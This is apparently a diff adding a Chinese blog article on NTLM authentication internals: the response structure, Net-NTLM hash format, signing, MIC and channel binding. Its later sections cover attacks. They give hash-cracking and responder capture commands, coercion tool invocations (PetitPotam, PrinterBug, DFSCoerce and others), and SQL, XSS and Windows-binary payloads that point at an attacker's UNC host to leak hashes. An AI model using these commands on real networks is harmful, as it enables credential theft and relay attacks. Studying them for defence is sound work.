+<tr>
+<td>8</td>
+<td>Timestamp</td>
+<td>Little-endian, 64-bit signed value representing the number of tenths of a microsecond since January 1, 1601.</td>
+</tr>
+<tr>
+<td>16</td>
+<td>Client Nonce</td>
+<td>8 bytes</td>
+</tr>
+<tr>
+<td>24</td>
+<td>Unknown</td>
+<td>4 bytes</td>
+</tr>
+<tr>
+<td>28</td>
+<td>Target Information</td>
+<td>Target Information block (from the Type 2 message).</td>
+</tr>
+<tr>
+<td><em>(variable)</em></td>
+<td>Unknown</td>
+<td>4 bytes</td>
+</tr>
+</tbody></table>
+<ul>
+<li>将 Type2中的challenge 、blob 拼在一起，将NTLMv2 Hash作为 HMAC-MD5 算法密钥进行加密生成16字节输出密文（NTproofstring）</li>
+<li>将 输出密文（NTproofstring）、blob拼接 得到 NTLMv2 Response</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824095728291.png" alt="image-20250824095728291"></p>
+<h1 id="Net-NTLM-hash"><a href="#Net-NTLM-hash" class="headerlink" title="Net-NTLM hash"></a>Net-NTLM hash</h1><p>首先 Net-NTLM hash 不是微软官方文档中的标准术语，它只是渗透测试和密码破解工具中采用的一种通用表示方法</p>
+<blockquote>
+<p>大部分文章都写的是：Net-NTLM hash在Response中，个人感觉不是很严谨会造成歧义，应该说：在Type3 Response中存在组成Net-NTLM hash的各个部分</p>
+</blockquote>
+<p>既然前面说到有不同的Response 类型，Net-NTLM hash 就有不同的构造方式，主要看两个：NTLM Response 和 NTLMv2 Response</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Net-NTLM v1 Hash </span><br><span class="line">username::hostname:LM responce:NTLM responce:Type2-challenge</span><br><span class="line"></span><br><span class="line"># Net-NTLM v2 Hash </span><br><span class="line">username::domain:Type2-challenge:NTproofstring:blob</span><br></pre></td></tr></table></figure>
+
+<p>手动构造一下 Net-NTLM v2 Hash：</p>
+<ul>
+<li>username：zhangsan</li>
+<li>domain：test</li>
+<li>challenge：bd639079c7fcae13</li>
+<li>NTproofstring：e9218482a856c8ea91acdb2955e3ad19</li>
+<li>blob: 0101000000000000de63a3a05c0fdc014c7821cf994e9fcd0000000002000800540045005300540001000a004d005300530051004c000400100074006500730074002e0063006f006d0003001c004d005300530051004c002e0074006500730074002e0063006f006d000500100074006500730074002e0063006f006d0007000800de63a3a05c0fdc01060004000200000008003000300000000000000000000000002000006ca4ab8eb09638f83f178c8c95150701240ef36ed3142205bcb6443442678d480a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e00310033003100000000000000000000000000</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zhangsan::test:bd639079c7fcae13:e9218482a856c8ea91acdb2955e3ad19:0101000000000000de63a3a05c0fdc014c7821cf994e9fcd0000000002000800540045005300540001000a004d005300530051004c000400100074006500730074002e0063006f006d0003001c004d005300530051004c002e0074006500730074002e0063006f006d000500100074006500730074002e0063006f006d0007000800de63a3a05c0fdc01060004000200000008003000300000000000000000000000002000006ca4ab8eb09638f83f178c8c95150701240ef36ed3142205bcb6443442678d480a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e00310033003100000000000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>通过hashcat爆破验证一下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt crack.txt --force</span><br><span class="line"></span><br><span class="line">john hash.txt -wordlist&#x3D;crack.txt</span><br><span class="line">john hash.txt --show</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250822030647548.png" alt="image-20250822030647548"></p>
+<h1 id="SSP-amp-SSPI"><a href="#SSP-amp-SSPI" class="headerlink" title="SSP &amp; SSPI"></a>SSP &amp; SSPI</h1><p>SSPI（安全支持提供程序接口，Security Support Provider Interface） ，这是 Windows 定义的一套接口，此接口定义了与安全有关的 功能函数，包括</p>
+<ul>
+<li><p>AcquireCredentialsHandle</p>
+</li>
+<li><p>InitializeSecurityContext</p>
+</li>
+<li><p>AcceptSecurityContext</p>
+</li>
+</ul>
+<p>用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，会话安全等。</p>
+<p>SSP（安全支持提供者，Security Support Provider），在系统层面，SSP就是一个dll，对SSPI相关功能函数的具体实现。比如 NTLM SSP 实现的就是一种 Challenge/Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。微软自己实现了如下的 SSP，用于提供安全功能：</p>
+<ol>
+<li>NTLM SSP</li>
+<li>Kerberos SSP</li>
+<li>Cred SSP</li>
+<li>Digest SSP</li>
+<li>Negotiate SSP</li>
+<li>Schannel SSP</li>
+<li>Negotiate Extensions SSP</li>
+<li>PKU2U SSP</li>
+</ol>
+<p>这里看一下 <strong>NTLM认证过程中</strong> 客户端和服务器都会用到的SSPI中的函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/ntlm_ssp.png"></p>
+<ol>
+<li>客户端通过 <strong>AcquireCredentialsHandle</strong> 函数获取用户凭据集的表示形式。</li>
+<li>客户端调用 <strong>InitializeSecurityContext</strong> 函数获取身份验证请求令牌（在本例中为Type1 NEGOTIATE），客户端将此令牌发送到服务器。</li>
+<li>服务器从客户端接收令牌，并将其作为 <strong>AcceptSecurityContext</strong>  函数的输入。这将在服务器上创建一个 <strong>本地安全上下文</strong> 来代表客户端，并生成一个身份验证响应令牌（Type2 CHALLENGE），该令牌将发送给客户端。</li>
+<li>客户端从服务器接收响应令牌，并再次调用 <strong>InitializeSecurityContext</strong> 函数，并将服务器的令牌作为输入传递。这为我们提供了另一个身份验证请求令牌（Type3 AUTHENTICATE）返回值表明安全上下文已成功初始化。</li>
+<li>服务器从客户端接收令牌，并使用令牌（Type 3）作为输入，再次调用 <strong>AcceptSecurityContext</strong>，返回值表示上下文已成功接受。不再生成令牌，身份验证完成。</li>
+</ol>
+<hr>
+<p>SSPI有什么作用？其实就是从底层SSP抽象出来了几个统一函数用来身份验证，只要几个函数能够被正确的调用，就可以不用关心下层的具体发了什么消息结构（例如NTLM中发送的消息结构为 Type 1/2/3，换成kerberos就不一样的结构了），这个抽象的、指向宽泛的消息结构被称为 <strong>Opaque Token（不透明令牌）</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823134751690.png" alt="image-20250823134751690"></p>
+<p>这一点非常重要，因为它清楚地表明了应用层（HTTP、SMB、SQL 等）与身份验证层（NTLM、Kerberos 等）完全独立，因此可以说NTLM也是个嵌入式协议，可以嵌入到上层协议中，我做了个简单的示意图</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823141317389.png" alt="image-20250823141317389"></p>
+<p>以java8 的 <code>sun.net.www.protocol.http.HttpURLConnection</code> 支持HTTP进行NTLM认证为例</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823143751980.png" alt="image-20250823143751980"></p>
+<p>最后通过JNI调用SSPI函数</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823144012488.png" alt="image-20250823144012488"></p>
+<h1 id="会话密钥"><a href="#会话密钥" class="headerlink" title="会话密钥"></a>会话密钥</h1><p>当认证完毕，在双方 <strong>协商启用会话签名</strong> 情况下，客户端和服务端使用一个都知道的 会话密钥（session key） 对后续所有的消息进行签名加/解密。那么双方是怎么获取到同一个会话密钥的呢？过程如下：</p>
+<ul>
+<li><p>exportedsessionkey：会话密钥（session key），<strong>客户端随机生成</strong></p>
+</li>
+<li><p>keyexchangekey：用于加密exportedsessionkey的字符串，其需要 <strong>用户密码、challenge等信息经过加密算法生成</strong></p>
+</li>
+<li><p>encryptedRandomSessionKey：通过 <strong>keyexchangekey 作为 RC4-key 加密 exportedsessionkey 得到</strong>，放在Type3消息中（Wireshark显示的 Session Key 字段，也是官方字段 EncryptedRandomSessionKeyFields）。服务端拿到这个，计算出 keyexchangekey 再运算得到exportedsessionkey，成功获得一致的会话密钥</p>
+</li>
+</ul>
+<p>所以当攻击者想要修改消息时，必须要获取会话密钥，但是没有用户密码就没有keyexchangekey，没有keyexchangekey就没法解密出会话密钥，所以就没法修改消息，保证了会话不被篡改。</p>
+<h1 id="会话签名"><a href="#会话签名" class="headerlink" title="会话签名"></a>会话签名</h1><p>会话签名是一种强大但有限的针对 NTLM 中继的缓解措施，只有 SMB 和 LDAP 可以使用。这里还要提醒，会话签名保护的是后续会话的完整性，而不是保护前期身份验证的完整性</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823191548974.png" alt="image-20250823191548974"></p>
+<p>上面说开启会话签名的情况会进行签名，那么客户端、服务端是怎么开启的？在什么时候开启的？能不能不开启？</p>
+<p>这里给出简短的结论：会话签名是否开启是在 NTLM 身份验证期间协商出来的，是根据双方 SMB/LDAP的版本/状态 来决定是否开启的</p>
+<p>针对会话签名状态基本有三种表达</p>
+<ul>
+<li>禁用（Disabled）：这意味着签名不受管理</li>
+<li>启用（Enabled）：可以在需要时处理签名，但不强制签名</li>
+<li>必填（Required）：支持并强制签名</li>
+</ul>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>首先一个SMB签名总结图：SMBv1 默认状态为 禁用（Disabled）</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823194239465.png" alt="image-20250823194239465"></p>
+<p>在 SMBv1 中，Server 的默认设置为 禁用（Disabled），<strong>在SMBv2或更高弃用了Disabled，Server 的默认状态为：启用（Enabled）</strong></p>
+<p>可以通过注册表查询</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters&quot; &#x2F;v RequireSecuritySignature</span><br><span class="line">    RequireSecuritySignature    REG_DWORD    0x0</span><br><span class="line"></span><br><span class="line">reg query &quot;HKLM\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters&quot; &#x2F;v EnableSecuritySignature</span><br><span class="line">    EnableSecuritySignature    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>
+
+<p>回到&lt;NTLM 网络认证流量分析&gt;中提到SMB其实是有三个大部分</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193006797.png" alt="image-20250823193006797"></p>
+<ul>
+<li><p>在协商阶段，双方分别表明自己的要求：是否要求其中一方签名</p>
+</li>
+<li><p>在认证阶段，双方表明各自支持的内容：是否有能力签名</p>
+</li>
+<li><p>在会话阶段，如果 <strong>要求</strong> 和 <strong>能力</strong> 兼容，则根据协商的结果进行会话</p>
+</li>
+</ul>
+<p>以域内两台普通机器为例：A -&gt; B 表明自己Enabled签名，但是不要求签名</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193247243.png" alt="image-20250823193247243"></p>
+<p>B-&gt; A 也表明自己Enabled签名，但是不要求签名</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193354008.png" alt="image-20250823193354008"></p>
+<p>在认证阶段 客户端和服务器 双方将 <strong>NEGOTIATE_SIGN</strong> 标志全都设置为 <strong>1</strong> ，因为它们都支持签名</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193604385.png" alt="image-20250823193604385"></p>
+<p>后续签名为空</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823194939696.png" alt="image-20250823194939696"></p>
+<p><strong>域控对SMB签名虽然默认状态为 启用（Enabled），但组策略强制对SMB进行签名</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250831223526784.png" alt="image-20250831223526784"></p>
+<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>LDAP状态略微不同：LDAP默认状态为 协商签名（Negotiated Signing），<strong>是否签名是由客户端决定的</strong>，因此LDAP数据都默认签名</p>
+<ul>
+<li>禁用（Disabled）: 不支持数据包签名</li>
+<li>协商签名（Negotiated Signing）：可以处理签名，<strong>如果与其通信的机器也支持签名，则将被签名</strong></li>
+<li>必需（Required）: 支持并强制签名</li>
+</ul>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823195859756.png" alt="image-20250823195859756"></p>
+<h1 id="身份验证签名-MIC"><a href="#身份验证签名-MIC" class="headerlink" title="身份验证签名/MIC"></a>身份验证签名/MIC</h1><p>既然NTLM协商阶段决定了是否开启会话，是不是能通过破坏身份验证的完整性、修改认证包来禁用会话签名，比如NEGOTIATE_SIGN？实则不然。</p>
+<p>引出了一个保护身份验证阶段的签名：消息完整性代码（Message Integrity Code）—MIC，用于保护身份认证消息的完整性！</p>
+<p>MIC 是一个签名存在于Type 3 消息中，MIC的计算方式如下：计算过程使用了 <strong>会话密钥+Type 1/2/3</strong>，因此攻击者无法重新计算MIC</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMAC_MD5(Session key, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE)</span><br></pre></td></tr></table></figure>
+
+<p>如果直接移除 MIC是不行的因为还有另一个标志 <strong>msAvFlags</strong> 指示 MIC 存在。它也存在于 Type3中的blob，如果它是 <strong>0x00000002</strong>，则告诉服务器必须存在 MIC</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823234941709.png" alt="image-20250823234941709"></p>
+<p>如果我们将其设置 msAcFlags 为 0，并移除 MIC，这也是不行的，因为此时blob被修改，将导致NTproofstring无效从而整个NTLMv2 Response无效</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823235126452.png" alt="image-20250823235126452"></p>
+<p>总结就是：MIC 保护 3 条消息的完整性，blob中msAvFlags标志保护 MIC 的存在性，NTLMv2 Response 保护标志的存在性。</p>
+<p>但是有一些CVE漏洞能够在目标上操作跨协议取消签名中继</p>
+<ul>
+<li>删除 MIC（CVE-2019-1040）</li>
+<li>删除 MIC 2（CVE-2019-1166）</li>
+<li>窃取会话密钥（CVE-2019-1019）</li>
+</ul>
+<h1 id="通道绑定-EPA"><a href="#通道绑定-EPA" class="headerlink" title="通道绑定/EPA"></a>通道绑定/EPA</h1><p>通道绑定（channel binding）或 EPA（身份验证的扩展保护）可以使用以下两种缓解措施中的一种或两种，为不支持会话签名的协议（如 HTTPS 和 LDAPS）提供针对 NTLM 中继的缓解：</p>
+<ul>
+<li>TLS Binding：当有 TLS 通道需要绑定（HTTPS、LDAPS）时，需要通道绑定令牌 (CBT)</li>
+<li>Service Binding：以服务主体名称 (SPN) 形式呈现的服务绑定信息，通常在没有可绑定的 TLS 通道 (HTTP) 时出现</li>
+</ul>
+<h1 id="跨协议Relay-签名图"><a href="#跨协议Relay-签名图" class="headerlink" title="跨协议Relay-签名图"></a>跨协议Relay-签名图</h1><p><strong>NTLM 身份验证消息嵌入在 SMB、HTTP、MSSQL、SMTP、IMAP 等应用协议的数据包中</strong>。LM 和 NTLM 身份验证协议独立于应用协议。这意味着可以通过某个协议（例如 HTTP）或另一个协议（例如 SMB）中继 LM 或 NTLM 身份验证消息。这称为 <strong>跨协议 LM/NTLM 中继</strong>。这也意味着可能的中继和攻击取决于身份验证消息所嵌入的应用协议。</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/ntlm_relay_cross_protocol.png"></p>
+<p>由于客户端/服务端不同的服务（SMB、LDAP、HTTP等）针对签名要求不相同，因此在跨协议组合时会产生各种 <strong>“签名兼容性”</strong></p>
+<p>小结各协议特点：</p>
+<ul>
+<li>SMB：SMB签名以 <strong>最低要求</strong> 的方式工作。如果客户端或服务器都不需要签名，则不会对会话进行签名，<strong>域控默认需要smb签名，而其他域机器默认不开启</strong></li>
+<li>LDAP：默认情况下LDAP服务器为域控，<strong>默认策略是协商签名，而不是强制签名，即 是否签名是由客户端决定的</strong>。微软于 2020 年 1 月发布安全更新，强制开启所有域控制器上 <code>LDAP channel binding</code> 与 <code>LDAP signing</code> 功能</li>
+<li>webdav、HTTP：<strong>不要求签名</strong></li>
+</ul>
+<p>下面的 <strong>跨协议中继-签名图</strong> 表示了：跨协议情况下，不同签名要求之间能否完成认证</p>
+<blockquote>
+<p>默认下，SMB无法 Relay 到 LDAP：LDAP server默认开启 协商签名（Negotiated Signing），因此如果客户端的NEGOTIATE_SIGN为1，那么LDAP server会开启会话签名，在Windows SMB client中默认NEGOTIATE_SIGN为1，所以无法从SMB relay 到 ldap</p>
+</blockquote>
+<img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/NTLM%20relay%20mitigation%20Cwqkh2tu.png" style="zoom:150%;" />
+
+<p> NTLM 跨协议中继的整体攻击路径：</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/NTLM%20relay.C4GvGhyz.png"></p>
+<h1 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h1><p>NTLM 的一些攻击面</p>
+<h2 id="Crack-破解"><a href="#Crack-破解" class="headerlink" title="Crack-破解"></a>Crack-破解</h2><p><strong>1. NTLM hash：</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 1000 ntlm.txt</span><br><span class="line">or</span><br><span class="line">直接cmd5在线解密</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. NTLMv2 hash/Net-NTLM v2 Hash</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600 hash.txt crack.txt --force</span><br><span class="line"></span><br><span class="line">john hash.txt -wordlist&#x3D;crack.txt</span><br><span class="line">john hash.txt --show</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.Net-NTLM v1 Hash</strong></p>
+<p>针对 Net-NTLM v1 Hash 需要搭配降级攻击 破解还原出 NTLM hash</p>
+<h2 id="Downgrade-降级攻击"><a href="#Downgrade-降级攻击" class="headerlink" title="Downgrade-降级攻击"></a>Downgrade-降级攻击</h2><p>参见参考，通过降级攻击衍生出的在不触及LSASS的情况下获取NTLM hash的攻击手段 Internal-Monologue<a href="(https://github.com/eladshamir/Internal-Monologue)">^3</a>，其基本原理为：<strong>通过修改注册表设置强制系统使用Net NTLMv1进行身份验证，然后本地调用NTLM认证包（MSV1_0），模拟目标用户的网络登录过程，从而获取NTLMv1 Response 并计算对应的NTLM hash</strong></p>
+<h2 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h2><p>针对 NTLM hash的横向利用，这篇文章不再记录</p>
+<p>后续单独写一篇文章关于PTH中一些细节： <code>UAC、LocalAccountTokenFilterPolicy、FilterAdministratorToken、KB2871997补丁、PTH的防御方法</code> </p>
+<h2 id="CVE漏洞"><a href="#CVE漏洞" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h2><p>关于NTLM的CVE，个人感觉分为三大类：发起NTLM请求、绕过签名完整性检查、Reflect</p>
+<p><strong>发起NTLM请求：</strong></p>
+<ul>
+<li>PetitPotam 等基于协议强制请求</li>
+<li>CVE-2018-8581、CVE-2025-24071、CVE-2025-24054 等基于各种应用诱导性请求</li>
+</ul>
+<p><strong>绕过签名完整性检查：</strong></p>
+<ul>
+<li><p>CVE-2015-0005</p>
+</li>
+<li><p>删除 MIC（CVE-2019-1040）</p>
+</li>
+<li><p>删除 MIC 2（CVE-2019-1166）</p>
+</li>
+<li><p>窃取会话密钥（CVE-2019-1019）</p>
+</li>
+</ul>
+<p><strong>Reflect：</strong></p>
+<ul>
+<li>MS08-068</li>
+<li>MS16-075、CVE-2019-1384（Ghost potato）等各种土豆系列</li>
+<li>CVE-2025-33073</li>
+</ul>
+<h2 id="NTLM-Relay"><a href="#NTLM-Relay" class="headerlink" title="NTLM Relay"></a>NTLM Relay</h2><p>Net-NTLM Hash v2 无法破解时可以尝试针对 Net-NTLM hash 的中继攻击：NTLM Relay（以下所称的 NTLM hash 实际均为 Net-NTLM hash），<strong>能否进行Relay攻击取决后续会话签名条件</strong>，如果都开启了签名是无法同服务端进行会话的，也就无法实现攻击操作（在不使用CVE情况下）</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824180908581.png" alt="image-20250824180908581"></p>
+<p>攻击主要分为两部分：</p>
+<ul>
+<li>获取Net-NTLM hash的方式</li>
+<li>获取Net-NTLM hash的后续 Relay 利用</li>
+</ul>
+<h1 id="Net-NTLM-hash获取"><a href="#Net-NTLM-hash获取" class="headerlink" title="Net-NTLM hash获取"></a>Net-NTLM hash获取</h1><p>有以下几种主要方式让目标机器主动或被动发起NTLM请求，然后我们捕获NTLM hash后进行后续中继攻击</p>
+<p>可以使用 responder 来捕获hash</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I eth1 -v</span><br></pre></td></tr></table></figure>
+
+<h2 id="强制认证"><a href="#强制认证" class="headerlink" title="强制认证"></a>强制认证</h2><p>通过以下几种 漏洞/特性/bug 强制目标主机发起身份认证</p>
+<h3 id="PrinterBug"><a href="#PrinterBug" class="headerlink" title="PrinterBug"></a>PrinterBug</h3><p>原理：MS-RPRN协议，通过触发 SpoolService 错误，强制目标通过 RPC 接口向攻击者进行身份验证</p>
+<p>条件：打印服务开启 - spoolsv.exe</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py">https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 printerbug.py hack.lab&#x2F;admin:password@&lt;target&gt; &lt;listener&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PetitPotam"><a href="#PetitPotam" class="headerlink" title="PetitPotam"></a>PetitPotam</h3><p>原理：MS-EFSRPC 协议，通过修改EfsRpcOpenFileRaw() 中的 FileName 参数劫持认证会话，强制服务器进行验证</p>
+<p>条件：目标支持 MS-EFSR 协议  PetitPotam</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/topotam/PetitPotam">https://github.com/topotam/PetitPotam</a></p>
+<blockquote>
+<p>PetitPotam 在2008、2012低版本环境下可无需用户匿名触发</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 PetitPotam.py -u admin -p password -d hack.lab &lt;listener&gt; &lt;target&gt;</span><br><span class="line">python3 PetitPotam.py -u &#39;WIN19$&#39; -hashes :c38ca.. -d test.com -dc-ip 172.22.4.7 WIN19.test.com 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<h3 id="DFSCoerce"><a href="#DFSCoerce" class="headerlink" title="DFSCoerce"></a>DFSCoerce</h3><p>原理：MS-EFSRPC 协议中的RPC接口来触发强制认证</p>
+<p>条件：域内启用 MS-DFSNM 协议、只对域控有效</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/Wh04m1001/DFSCoerce">https://github.com/Wh04m1001/DFSCoerce</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dfscoerce.py -u admin -p password -d hack.lab &lt;listener&gt; &lt;target&gt;</span><br><span class="line">python3 dfscoerce.py -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<h3 id="ShadowCoerce"><a href="#ShadowCoerce" class="headerlink" title="ShadowCoerce"></a>ShadowCoerce</h3><p>原理：MS-FSRVP协议中一种依赖于远程UNC路径的特定方法来实现强制验证 IsPathSupported() 和 IsPathShadowCopied()</p>
+<p>条件：开启MS-FSRVP协议、安装了文件服务器VSS代理服务</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/ShadowCoerce">https://github.com/ShutdownRepo/ShadowCoerce</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 shadowcoerce.py -u admin -p password -d hack.lab &lt;listener&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="PrivExchange"><a href="#PrivExchange" class="headerlink" title="PrivExchange"></a>PrivExchange</h3><p>原理：Exchange中提供了网络服务API - PushSubscription，允许订阅推送通知，利用该API使Exchange服务器对指定目标进行强制认证</p>
+<p>条件：目标为Exchange，且未打补丁、拥有一个带有邮箱的域用户凭据信息</p>
+<p>poc：<a target="_blank" rel="noopener" href="https://github.com/dirkjanm/privexchange/">https://github.com/dirkjanm/privexchange/</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 privexchange.py -u admin -p password -d hack.lab -ah &lt;listener&gt; &lt;exchange server&gt;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="综合利用"><a href="#综合利用" class="headerlink" title="综合利用"></a>综合利用</h3><p><a target="_blank" rel="noopener" href="https://github.com/p0dalirius/Coercer">https://github.com/p0dalirius/Coercer</a> ，通过多种方法自动强制 Windows 服务器在任意机器上进行身份验证</p>
+<p>分析目标服务器可利用的接口，使用 –analyze 参数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 Coercer.py -u admin -p password -d hack.lab -l &lt;listener&gt; -t &lt;target&gt; --analyze</span><br></pre></td></tr></table></figure>
+
+<h2 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h2><p><strong>Mysql</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;\\\\&lt;Kali address&gt;\\mysql&#39;);</span><br></pre></td></tr></table></figure>
+
+<p><strong>Mssql</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xp_dirtree &quot;\\&lt;Kali address&gt;\aaa.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>XSS</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;\\&lt;Kali address&gt;\xss&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>xxe/ssrf 等能发起请求的web漏洞</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如: WEBDAV</span><br></pre></td></tr></table></figure>
+
+<p><strong>系统命令</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 未验证</span><br><span class="line">net.exe use \\host\shareFload </span><br><span class="line">attrib.exe \\host\shareFload  </span><br><span class="line">bcdboot.exe \\host\shareFload  </span><br><span class="line">bdeunlock.exe \\host\shareFload  </span><br><span class="line">cacls.exe \\host\shareFload  </span><br><span class="line">certreq.exe \\host\shareFload #(noisy, pops an error dialog) </span><br><span class="line">certutil.exe \\host\shareFload  </span><br><span class="line">cipher.exe \\host\shareFload  </span><br><span class="line">ClipUp.exe -l \\host\shareFload  </span><br><span class="line">cmdl32.exe \\host\shareFload  </span><br><span class="line">cmstp.exe &#x2F;s \\host\shareFload  </span><br><span class="line">colorcpl.exe \\host\shareFload #(noisy, pops an error dialog)  </span><br><span class="line">comp.exe &#x2F;N&#x3D;0 \\host\shareFload \\host\shareFload  </span><br><span class="line">compact.exe \\host\shareFload  </span><br><span class="line">control.exe \\host\shareFload  </span><br><span class="line">convertvhd.exe -source \\host\shareFload -destination \\host\shareFload  </span><br><span class="line">Defrag.exe \\host\shareFload  </span><br><span class="line">diskperf.exe \\host\shareFload  </span><br><span class="line">dispdiag.exe -out \\host\shareFload  </span><br><span class="line">doskey.exe &#x2F;MACROFILE&#x3D;\\host\shareFload  </span><br><span class="line">esentutl.exe &#x2F;k \\host\shareFload  </span><br><span class="line">expand.exe \\host\shareFload  </span><br><span class="line">extrac32.exe \\host\shareFload  </span><br><span class="line">FileHistory.exe \\host\shareFload #(noisy, pops a gui)  </span><br><span class="line">findstr.exe * \\host\shareFload  </span><br><span class="line">fontview.exe \\host\shareFload #(noisy, pops an error dialog)  </span><br><span class="line">fvenotify.exe \\host\shareFload #(noisy, pops an access denied error)  </span><br><span class="line">FXSCOVER.exe \\host\shareFload #(noisy, pops GUI)  </span><br><span class="line">hwrcomp.exe -check \\host\shareFload  </span><br><span class="line">hwrreg.exe \\host\shareFload  </span><br><span class="line">icacls.exe \\host\shareFload   </span><br><span class="line">licensingdiag.exe -cab \\host\shareFload  </span><br><span class="line">lodctr.exe \\host\shareFload  </span><br><span class="line">lpksetup.exe &#x2F;p \\host\shareFload &#x2F;s  </span><br><span class="line">makecab.exe \\host\shareFload  </span><br><span class="line">msiexec.exe &#x2F;update \\host\shareFload &#x2F;quiet  </span><br><span class="line">msinfo32.exe \\host\shareFload #(noisy, pops a &quot;cannot open&quot; dialog)  </span><br><span class="line">mspaint.exe \\host\shareFload #(noisy, invalid path to png error)  </span><br><span class="line">msra.exe &#x2F;openfile \\host\shareFload #(noisy, error)  </span><br><span class="line">mstsc.exe \\host\shareFload #(noisy, error)  </span><br><span class="line">netcfg.exe -l \\host\shareFload -c p -i foo</span><br></pre></td></tr></table></figure>
+
+<h2 id="CVE漏洞-1"><a href="#CVE漏洞-1" class="headerlink" title="CVE漏洞"></a>CVE漏洞</h2><p>最近时间的 Windows 文件资源管理器欺骗漏洞（CVE-2025-24071、CVE-2025-24054）解压文件时导致泄露NTLM hash</p>
